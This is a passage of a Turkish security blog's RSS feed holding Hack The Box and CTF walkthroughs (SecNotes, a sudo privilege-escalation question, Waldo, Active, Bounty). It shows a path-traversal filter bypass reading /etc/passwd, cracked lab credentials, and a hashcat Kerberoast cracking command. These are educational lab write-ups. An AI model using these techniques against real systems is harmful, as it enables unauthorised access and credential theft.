+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-12.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-12-1024x358.png" alt="" class="wp-image-449"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Dizini bulduktan sonra <strong>bash.exe&#8217;</strong>yi çalıştırıyorum ve makineye erişmiş oluyorum. Öncelikle etkileşimli shell almadan içimiz rahat etmez diyerek alıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-13.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-13.png" alt="" class="wp-image-450"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Etkileşimli shell aldık ve root olarak bağlanmışız.</p>
+
+
+
+<p>Ama <strong>/root</strong> içinde <strong>root.txt</strong> yok <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-14.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-14.png" alt="" class="wp-image-455"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Çünkü bizden ubuntu içinde root olmamız istenmiyor. Windows içinde Administrator olmamız isteniyor. Aramalarımıza devam ediyoruz. İlk önce en sevdiğim dosyanın içeriğini inceliyoruz. <strong>.bash_history</strong> dosyası.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-15.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-15.png" alt="" class="wp-image-451"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Dosyanın içeriğinde gözüküyor ki administrator smbclient ile parolası açık bir şekilde bağlanmış. Bizde aynı şekilde bağlanıyoruz.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-16.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-16-1024x341.png" alt="" class="wp-image-452"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Aynı şekilde bağlandık ve root.txt&#8217;i çektik. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-17.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-17.png" alt="" class="wp-image-453"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Ubuntu makinesine çektiğimiz root.txt&#8217;mizi okuduk ve makineyi tamamladık.</p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Yetki Yükseltme CTF Sorusu</title>
+		<link>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html</link>
+					<comments>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Mon, 07 Jan 2019 10:53:20 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=463</guid>
+
+					<description><![CDATA[Merhaba !!! Geçen haftalarda 3 arkadaşımla birlikte katıldığımız bir CTF&#8217;te geçen bir sorunun çözümünü ve nasıl hazırlandığını paylaşacağım. Öncelikle CTF&#8217;te hedef makineye erişip ve yetki&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Geçen haftalarda 3 arkadaşımla birlikte katıldığımız bir CTF&#8217;te geçen bir sorunun çözümünü ve nasıl hazırlandığını paylaşacağım.</p>
+
+
+
+<span id="more-463"></span>
+
+
+
+<p>Öncelikle CTF&#8217;te hedef makineye erişip ve yetki yükselttikten sonra tüm soruları görebiliyorduk. Sorular internet ortamında yayınlanmadığı için aklımda kalan bu soruyu paylaşıyorum. Çok kolay bir soruydu. Hedef makineden shell aldıktan sonra root olmamız gerekiyordu.</p>
+
+
+
+<p>Öncelikle<strong> sudo -l</strong> komutuyla ayrıcalıklı dosyalara bakmak istedim ve aşağıdaki gibi bir çıktı gördüm.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1024x152.png" alt="" class="wp-image-464"/></a></figure>
+
+
+
+<p>Masaüstündeki bir dosyanın root haklarıyla ama parola gerekmeksizin çalıştırabiliyordu. Birkaç yolla root olabilirdiniz. Örneğin bu dosya bash dosyası olduğu için etkileşimli shell almak için kullanılan python scriptini dosyanın içeriğine yazıp çalıştırarak.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-2.png" alt="" class="wp-image-465"/></a></figure>
+
+
+
+<p>Diğer bir örnek ise <strong>symlink</strong> kullanarak root olunabilir.</p>
+
+
+
+<p>Öncelikle masaüstündeki dosya silinir. Çünkü aynı isimde dosya olduğunda symlink veremezsiniz. <strong>/bin/bash</strong> yoluna symlink verilir ve <strong>sudo</strong> komutu ile çalıştırılır.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-3.png" alt="" class="wp-image-466"/></a><figcaption><br></figcaption></figure>
+
+
+
+<p>Değişiklik olması amacıyla ek olarak bu sorunun nasıl düzenlendiğini paylaşacağım. <strong>sudo </strong>komutunun yetkileriyle alakalı düzenlemeler <strong>/etc/sudoers</strong> dosyasından yapılır.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-4-1024x595.png" alt="" class="wp-image-468"/></a></figure>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-6-1024x166.png" alt="" class="wp-image-469"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Varsayılan olarak gelen <strong>sudoers</strong> dosyası ve komutununda çıktısı ekran görüntülerindeki gibidir</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-5.png" alt="" class="wp-image-467"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Ayrıcalıklı dosyayı eklemek için <strong>/etc/sudoers </strong>içine en altta eklediğim gibi ekleyerek verilen dosyanın root yetkileriyle ama herhangi bir parolaya ihtiyacı olmadan çalıştırmasına izin verir. Düzenlediğimiz sudoers dosyasının çıktısıda CTF sorumuz oluyor.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1-1024x152.png" alt="" class="wp-image-470"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Waldo &#8211; Hack The Box</title>
+		<link>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html</link>
+					<comments>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Sun, 16 Dec 2018 08:24:06 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Hack The Box]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=398</guid>
+
+					<description><![CDATA[Merhaba !!! Şimdi Hack The Box içerisinde yeni emekliye ayrılmış Waldo makinesinin çözümünü paylaşacağım. Öncelikle nmap taramasıyla port durumlarını inceleyelim. SSH servisi ve HTTP servisi&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Şimdi Hack The Box içerisinde yeni emekliye ayrılmış Waldo makinesinin çözümünü paylaşacağım.</p>
+
+
+
+<span id="more-398"></span>
+
+
+
+<p>Öncelikle nmap taramasıyla port durumlarını inceleyelim.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-1.png" alt="" class="wp-image-399"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>SSH servisi ve HTTP servisi çalışıyormuş. Büyük ihtimal web tarafından birşeyler yaparak ssh ile bağlanmamızı istiyor. Web sayfasını inceleyelim.</p>
+
+
+
+<p> </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-2-1024x518.png" alt="" class="wp-image-400"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<p>Bir html sayfası geldi. Liste yönetimi adında bir sayfa. Liste ekleyebiliyoruz silebiliyoruz listeleyebiliyoruz. Buradan böyle birşey çıkmayacak gibi duruyor. Birde proxy ile inceleyelim. Burp suite ile biraz daha inceleyelim. Burp suite için küçük bir ayar gerekiyor.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-3.png" alt="" class="wp-image-401"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<p>Ayarımızı yaptıktan sonra liste ekleme silme ve listeleme işlemlerini yapıp içeriklerini inceliyorum.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-4-1024x273.png" alt="" class="wp-image-402"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Liste eklemede <strong>fileWrite.php&nbsp;</strong> dosyasını çalıştırıyor. Numara ve içeriğini alıyor. Ben deneme amaçlı Ridvan yazdım ve numarasını 34 yaptım. Yazıldığına dair true değerini döndürdü. Birde bunu okuyalım. Okumak için ise <strong>fileRead.php</strong> dosyasını çalıştırıyor. <br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-5-1024x277.png" alt="" class="wp-image-403"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Dosyamızı okuduk. Peki biz bunu nasıl kendi amacımız için kullanabiliriz ? Mesela buradan sunucuya ait dosyalar okuyabilir miyiz diye aklımıza gelmesi gerekiyor. Birde <strong>dirRead.php </strong>dosyası var. O anki dizinde neler olduğunu listelemek için. En üst dizinde neler varmış bakalım.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-6-1024x182.png" alt="" class="wp-image-404"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Mesela <strong>fileRead.php</strong> varmış. Bu dosyanın içeriğine bakalım. </p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-7.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-7-1024x200.png" alt="" class="wp-image-405"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Evet kaynak kodlarını görebiliyoruz. Buradan biraz karmaşık olduğu için biraz düzenledim. </p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-8.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-8-1024x770.png" alt="" class="wp-image-406"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Biraz php kodu okuyabiliyorsanız rahatlıkla olayı anlıyorsunuzdur. Bu koddaki tek sorun gönderilen dosya ismini değiştiriyor ( str_replace kısmı ) olması. İki tane nokta ve / işareti yanyana olduğunda farklı karakterle değiştiriyor. Bunu şu şekilde atlattım. </p>
+
+
+
+<p><strong>&#8230;.//&#8230;.//&#8230;.//etc/passwd </strong>şekilde. <br></p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-9.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-9-1024x257.png" alt="" class="wp-image-407"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Evet /etc/passwd içeriğini okuduk. Hatırlarsanız SSH portu açıktı. Uzaktan bağlanabilmek için rsa keyi var mı yok mu bakalım. Home içerisindeki kullanıcının ismi nobody. Ama birkaç deneme yapınca .ssh içindeki key&#8217;in ismini bulamadım. Aklıma <strong>dirRead.php</strong> ile bakmak geldi. Aynı şekilde çift .. ve çift / işareti kullanınca onuda atlattım<br></p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-12.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-12-1024x187.png" alt="" class="wp-image-409"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Dosyamızın ismi .monitor. Ve içeriğini okuyoruz.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-10.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-10-1024x280.png" alt="" class="wp-image-408"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<p>Keyimize ulaştık ve ssh ile bağlanalım.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image is-resized"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-11.png"><img decoding="async" loading="lazy" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-11.png" alt="" class="wp-image-410" width="580" height="171"/></a><figcaption><br></figcaption></figure>
+
+
+
+<p>Bağlandık ve <strong>user.txt</strong> mizi okuduk.</p>
+
+
+
+<p>Kullanıcıyı ele geçirdikten sonra sıradaki amacımız root kullanıcısı olmak. Dizinleri incelerken <strong>.ssh </strong>içerisinde ki dosyada farklı bir kullanıcıylada ssh ile bağlanabildiğimi gördüm.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-13.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-13-1024x324.png" alt="" class="wp-image-421"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Ssh ile bağlandım ve karşıma bir docker çıktı. Ama bu makinede komutları çalıştıramıyordum. Ekran görüntüsündeki gibi komut bulunamadı hatası aldım.<br></p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-14.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-14.png" alt="" class="wp-image-422"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Bunu atlatabilmek için internette biraz araştırma yaptım ve karşıma <em><strong>&#8211;noprofile </strong></em>ve<strong> &#8211;norc </strong>komutları karşıma çıktı.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-15.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-15.png" alt="" class="wp-image-423"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Monitor kullanıcısı olarak normal shell&#8217;e sahibiz. Bundan sonra biraz daha araştırıyoruz ve ilginç birşeyler bulmaya çalışıyoruz.</p>
+
+
+
+<p>Ve <strong>/sbin/getcap </strong>te değişik birşeyler olduğunu buldum. Nasıl buldunuz derseniz sunucuda ne varsa araştırıyorsunuz. 5 dakika içerisinde bulmuş değilim. Uzun bir süre inceleme yapmıştım.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-16.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-16.png" alt="" class="wp-image-424"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p><a rel="noreferrer noopener" aria-label="Getcap dosyaların yeteneklerini inceler. 
+ (yeni sekmede açılır)" href="http://man7.org/linux/man-pages/man8/getcap.8.html" target="_blank">Getcap</a> dosyaların yeteneklerini inceler. </p>
+
+
+
+<p>-r parametresi ile / (kök dizini) altında&nbsp; yinemeli arama yapar. Yetki hatalarını ekrana bastırmaması içinde<strong> 2&gt;/dev/null i</strong>le göstermez. </p>
+
+
+
+<p>2 sonuç çıktı. tac komutu cat komutunun aynısı tek farkı dosyayı son satırdan okumaya başlar. Örnekteki gibi.<br></p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-18.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-18-1024x650.png" alt="" class="wp-image-425"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p><a rel="noreferrer noopener" aria-label="cap_dac_read_search+ei&nbsp;&nbsp; ise isminde de anlaşılacağı üzere okuma işlemi için tam yetkisi vardır anlamı taşıyor diyebiliriz. (yeni sekmede açılır)" href="https://www.insecure.ws/linux/getcap_setcap.html" target="_blank">cap_dac_read_search+ei</a>&nbsp;&nbsp; ise isminde de anlaşılacağı üzere okuma işlemi için tam yetkisi vardır anlamı taşıyor diyebiliriz.</p>
+
+
+
+<p>Yani anlaşılacağı üzere ikisini birleştirdiğimizde tac ile root yetkilerinde ki dosyaları okuyabiliriz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-17.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-17.png" alt="" class="wp-image-426"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Ve root yetkisiyle okunabilen root.txt&#8217;mizi de okuduk. </p>
+
+
+
+<p> Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+
+
+
+<p>Gereksiz Bilgi : Bu makineyi aktif olduğu 2. veya 3. haftasında çözmüştüm. Direkt root shell&#8217;i almaya çalışmıştım ama alamamıştım.<br></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Active &#8211; Hack The Box</title>
+		<link>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html</link>
+					<comments>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Sat, 08 Dec 2018 14:12:49 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Hack The Box]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=373</guid>
+
+					<description><![CDATA[Merhaba !!! Az önce emekliye ayrılan Active makinesinin çözümünü paylaşıyorum. Öncelikle makinemizin ağ haritasını çıkartmak ile başlayalım. Nmap taramamız sonucunu biraz yorumlayalım. Windows makinesi olduğu&#8230;]]></description>
+										<content:encoded><![CDATA[<p>Merhaba !!!</p>
+<p>Az önce emekliye ayrılan Active makinesinin çözümünü paylaşıyorum. Öncelikle makinemizin ağ haritasını çıkartmak ile başlayalım.</p>
+<p><span id="more-373"></span></p>
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-1-1024x498.png" alt="" class="wp-image-375"/></a><figcaption><br></figcaption></figure></div>
+
+
+
+<p>Nmap taramamız sonucunu biraz yorumlayalım. Windows makinesi olduğu bariz belli. Domain isminin de<em> active.htb</em> olduğu yazıyor. Birçok portumuz açık. Hedef makinesini biraz daha numaralandıralım.</p>
+
+
+
+<p><em>enum4linux 10.10.10.100</em> komutu ile bakabiliriz. Baktığımızda varsayılan olan paylaşım yerlerinden farklı olarak <em>Replication</em> kısmı gözümüzü çarpıyor.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-2.png" alt="" class="wp-image-376"/></a><figcaption><br></figcaption></figure>
+
+
+
+<p>Bundan sonra oradan ilerlemeye devam ediyoruz. Smbclient ile parolasız bağlanmayı deneyebiliriz.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-3-1024x252.png" alt="" class="wp-image-377"/></a></figure>
+
+
+
+<p></p>
+
+
+
+<p>Smbclient ile bağlandık ve içeriyi biraz kurcalayınca bir dosya bulduk Group.xml. Dosyanın içinde username ve cpassword gibi değerler geçtiğini görünce internette biraz araştırma yaptım. Ve bu dosyadan kolaylıkla kullanıcı adı ve parola çıkartabileceğimi öğrendim. Cpassword şifrelenmiş haldeydi ve linuxta rahatlıkla kırabildim.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-4-1024x94.png" alt="" class="wp-image-378"/></a></figure>
+
+
+
+<p></p>
+
+
+
+<p>Kullanıcı adı SVC_TGS</p>
+
+
+
+<p>Parola ise GPPstillStandingStrong2k18</p>
+
+
+
+<p>Elimizdeki bilgilerden neler yapabiliriz diye araştırırken <a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/" target="_blank" rel="noreferrer noopener" aria-label="Elimizdeki bilgilerden neler yapabiliriz diye araştırırken şu siteye rastladım. Ve denemeye başladım. (yeni sekmede açılır)">şu siteye</a> rastladım. Ve denemeye başladım.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-5-1024x251.png" alt="" class="wp-image-379"/></a></figure>
+
+
+
+<p></p>
+
+
+
+<p>Administrator kullanıcısının parolasının şifreli halini bulduk. Hashcat veya başka bir araçla kırabiliriz.</p>
+
+
+
+<p><em>hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt –force</em></p>
+
+
+
+<p>komutu ile kırdım ve parola<em> Ticketmaster1968 </em>çıktı.</p>
+
+
+
+<p>Elimizde yöneticinin parolası ve domain ismi elimizde olduğuna göre psexec ile bağlanabiliriz. Ben githubdan manuel olarak bağlanabileceğim şeklini kullanacağım. İsterseniz metasploit frameworkünde ( <em>exploit/windows/smb/psexec )</em> bu exploiti de kullanarak komut satırına düşebilirsiniz.</p>
+
+
+
+<p></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-6.png" alt="" class="wp-image-380"/></a></figure>
+
+
+
+<p></p>
+
+
+
+<p>Administrator yetkisiyle bağlandık ve root.txt imizi okuduk.</p>
+
+
+
+<p>Githubdan kullandığım depo :<a href="https://github.com/SecureAuthCorp/impacket"> https://github.com/SecureAuthCorp/impacket</a></p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Bounty &#8211; Hack The Box</title>
+		<link>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html</link>
+					<comments>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Sat, 27 Oct 2018 13:15:56 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Hack The Box]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=339</guid>
+
+					<description><![CDATA[Merhaba !!! Hack The Box&#8217;dan çözeceğim makine Bounty. İlk önce ağ haritasını çıkartarak işe başlayalım. &#160; Nmap taraması sonucunda sadece bir tane portun açık olduğunu&#8230;]]></description>
+										<content:encoded><![CDATA[<p>Merhaba !!!</p>
+<p>Hack The Box&#8217;dan çözeceğim makine Bounty. İlk önce ağ haritasını çıkartarak işe başlayalım.</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-1.png"><span id="more-339"></span><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-340" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-1.png" alt="" width="900" height="220" /></a></p>
+<p>&nbsp;</p>
+<p>Nmap taraması sonucunda sadece bir tane portun açık olduğunu söylüyor. Bu port üzerinde web server çalışıyormuş. Tarayıcıda bir görelim.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-2.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-341" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-2.png" alt="" width="1711" height="564" /></a></p>
+<p>&nbsp;</p>
+<p>Bizi hoş bir resim karşılıyor. Burda yapacağımız en mantıklı şey dizinleri ve sayfaları bulmak. Bu sefer farklılık olarak sıradan dirb ile tarama yapacağım.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-3.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-342" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-3.png" alt="" width="704" height="405" /></a></p>
+<p>&nbsp;</p>
+<p>Bir tane <em>UploadedFiles </em>adlı bir dizin ve bir tane de <em>transfer.aspx </em>adlı bir sayfa çıktı. Çok sade bir makineymiş. Dizini ve sayfayı inceleyim.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-15.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-343" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-15.png" alt="" width="1919" height="391" /></a></p>
+<p>&nbsp;</p>
+<p><em>UploadedFiles</em> dizinine gidince 403 yasak hatası alıyoruz.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-4.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-344" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-4.png" alt="" width="560" height="214" /></a></p>
+<p><em>transfer.aspx </em>sayfasını açtığımızda bir tane dosya yükleme kısmı karşılıyor. Birçok farklı shell alabileceğim dosyayı yükledim ama hepsinde geçersiz dosya hatasıyla karşılaştım. Sadece .<em>config</em> uzantılı dosyaları kabul etti. Bunu bulana kadar biraz canım çıktı. İnternette biraz araştırdıktan sonra nasıl shell alabileceğimi buldum. <a href="https://pastebin.com/H1AeShMW" target="_blank" rel="noopener noreferrer">Bu linkteki</a> kodu .config uzantısıyla yüklediğim de kısıtlıda olsa kod çalıştırabileceğim bir sayfa elde ettim.</p>
